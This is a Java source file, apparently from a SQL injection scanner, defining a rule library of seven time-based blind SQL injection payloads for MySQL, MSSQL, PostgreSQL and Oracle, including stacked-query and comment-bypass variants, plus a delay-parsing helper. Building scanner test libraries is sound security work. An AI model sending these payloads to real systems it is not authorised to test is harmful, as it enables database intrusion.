package com.xzhscan.payload;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

/**
 * Payload 规则库（v1.2）。
 *
 * 设计约束（任务书第二节）：
 *  - 原始文本逐字保存：空格、引号、分号、行注释与内联注释字符一律不动，
 *    不做任何"规范化/自动编码"——编码发生在请求构造层（ParameterMutators），
 *    而不是库层；
 *  - 按数据库与语法特征分类，不默认通用；注释变体独立标记而非误判为其他数据库；
 *  - 标记字符串/数值上下文、是否多语句（stacked）、去重组（相似规则）；
 *  - 本库默认样本仅用于规则兼容性审阅、请求序列化测试与本地 Mock 回归；
 *    v1.2 不将其接入自动扫描，不扩大自动化攻击能力。
 */
public final class PayloadLibrary {

    /** 适用数据库。 */
    public enum Db {
        MySQL("MySQL / MariaDB"),
        MSSQL("Microsoft SQL Server"),
        PostgreSQL("PostgreSQL"),
        Oracle("Oracle"),
        GENERIC("未指定");

        public final String displayName;

        Db(String displayName) {
            this.displayName = displayName;
        }
    }

    /** 适用上下文。 */
    public enum Context {
        STRING, NUMERIC, ANY
    }

    /**
     * 一条 Payload 规则。
     *
     * @param raw            原始文本（逐字，永不修改）
     * @param db             适用数据库
     * @param context        适用参数上下文
     * @param stacked        是否涉及多语句执行（; 分号串联）
     * @param commentVariant 是否注释绕过变体（如空格 -> 内联注释）
     * @param dedupGroup     去重组标识：同组规则视为同一 payload 家族的变体
     */
    public record PayloadSpec(String raw, Db db, Context context, boolean stacked,
                              boolean commentVariant, String dedupGroup) {
    }

    /**
     * 内置 7 条时间盲注样本（用户提供，逐字保存）。
     * 分类依据：
     *  - XOR+sleep -> MySQL；WAITFOR DELAY -> MSSQL；pg_sleep -> PostgreSQL；
     *    DBMS_PIPE.RECEIVE_MESSAGE -> Oracle；
     *  - 前置分号（';/1';）意味着多语句执行 -> stacked=true；
     *  - 空格被内联注释替换的版本 -> commentVariant=true，与对应空格版同 dedupGroup。
     */
    public static final List<PayloadSpec> DEFAULT_TIME_PAYLOADS = Collections.unmodifiableList(Arrays.asList(
            new PayloadSpec("0'XOR(if(1,sleep(6),0))XOR'Z", Db.MySQL, Context.STRING, false, false, "mysql-xor-sleep"),
            new PayloadSpec("';WAITFOR DELAY '0:0:6'--", Db.MSSQL, Context.STRING, true, false, "mssql-waitfor"),
            new PayloadSpec("1';WAITFOR DELAY '0:0:6'--", Db.MSSQL, Context.STRING, true, false, "mssql-waitfor"),
            new PayloadSpec("';SELECT pg_sleep(6)--", Db.PostgreSQL, Context.STRING, true, false, "pgsql-pg-sleep"),
            new PayloadSpec("' || DBMS_PIPE.RECEIVE_MESSAGE('a', 6) || '", Db.Oracle, Context.STRING, false, false, "oracle-pipe"),
            new PayloadSpec("';WAITFOR/**/DELAY/**/'0:0:6'--", Db.MSSQL, Context.STRING, true, true, "mssql-waitfor"),
            new PayloadSpec("';SELECT/**/pg_sleep(6)--", Db.PostgreSQL, Context.STRING, true, true, "pgsql-pg-sleep")
    ));

    /**
     * 预期延迟秒数（当前 7 条样本均为 6s；后续新增可按 raw 解析扩展）。
     * 第一阶段判定阈值 = sleepSeconds * 1000 * 0.5（半延迟即视为命中信号，
     * 交给第二阶段三级时间复验定罪）。
     */
    public static int sleepSecondsOf(PayloadSpec p) {
        // 匹配 sleep(6) / ('a', 6) / DELAY '0:0:6' 中的数字参数（取最后一个）
        java.util.regex.Matcher m = java.util.regex.Pattern
                .compile("sleep\\(([0-9]{1,3})\\)|,\\s*([0-9]{1,3})\\)|0:0:([0-9]{1,3})")
                .matcher(p.raw());
        int seconds = 0;
        while (m.find()) {
            for (int g = 1; g <= m.groupCount(); g++) {
                if (m.group(g) != null) {
                    try {
                        seconds = Integer.parseInt(m.group(g));
                    } catch (NumberFormatException ignored) {
                    }
                }
            }
        }
        return Math.max(1, seconds > 0 ? seconds : 6); // 样本族默认 6s
    }
}
